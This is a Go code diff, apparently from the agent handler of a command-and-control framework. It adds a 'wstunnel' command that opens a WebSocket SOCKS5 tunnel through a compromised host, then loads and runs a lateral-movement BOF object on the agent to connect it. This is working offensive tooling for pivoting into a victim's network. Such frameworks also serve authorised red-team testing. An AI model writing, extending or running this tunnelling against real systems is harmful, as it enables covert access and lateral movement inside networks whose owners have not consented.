@@ -1034,6 +1034,56 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			goto RET
 		}
 
+	case "wstunnel":
+		if subcommand == "start" {
+			lHost, ok := args["l_host"].(string)
+			if !ok {
+				err = errors.New("parameter 'l_host' must be set")
+				goto RET
+			}
+			lPort, ok := args["l_port"].(float64)
+			if !ok {
+				err = errors.New("parameter 'l_port' must be set")
+				goto RET
+			}
+
+			// 创建 WebSocket SOCKS5 隧道并获取 WebSocket URL
+			tunnelId, wsUrl, err := ts.TsTunnelCreateWsSocks5(agent.Id, "WebSocket SOCKS5", lHost, int(lPort))
+			if err != nil {
+				err = fmt.Errorf("failed to create WebSocket SOCKS5 tunnel: %v", err)
+				goto RET
+			}
+
+			// 读取 BOF 文件
+			bofPath := "Extension-Kit/LateralMovement-BOF/_bin/wstunnel.x64.o"
+			bofContent, err := ts.TsGetBofFile(bofPath)
+			if err != nil {
+				err = fmt.Errorf("failed to read BOF file from server: %v", err)
+				goto RET
+			}
+
+			// 构建参数：直接传递字符串数据
+			// Agent 端的 UnpackBytes 会自动处理长度，BOF 接收到的是原始数据
+			// BOF 中需要自己处理参数解析（手动添加长度前缀或直接使用）
+			urlBytes := []byte(wsUrl)
+			// 为了符合 BeaconDataExtract 的格式，需要添加长度前缀
+			params := make([]byte, 4+len(urlBytes))
+			params[0] = byte(len(urlBytes))
+			params[1] = byte(len(urlBytes) >> 8)
+			params[2] = byte(len(urlBytes) >> 16)
+			params[3] = byte(len(urlBytes) >> 24)
+			copy(params[4:], urlBytes)
+
+			// 执行 BOF
+			array = []interface{}{COMMAND_EXEC_BOF, "go", len(bofContent), bofContent, len(params), params}
+			taskData.Message = fmt.Sprintf("WebSocket SOCKS5 tunnel created (ID: %s)\nConnecting to: %s", tunnelId, wsUrl)
+			taskData.MessageType = MESSAGE_INFO
+
+		} else {
+			err = errors.New("subcommand must be 'start'")
+			goto RET
+		}
+
 	case "terminate":
 		if subcommand == "thread" {
 			array = []interface{}{COMMAND_TERMINATE, 1}
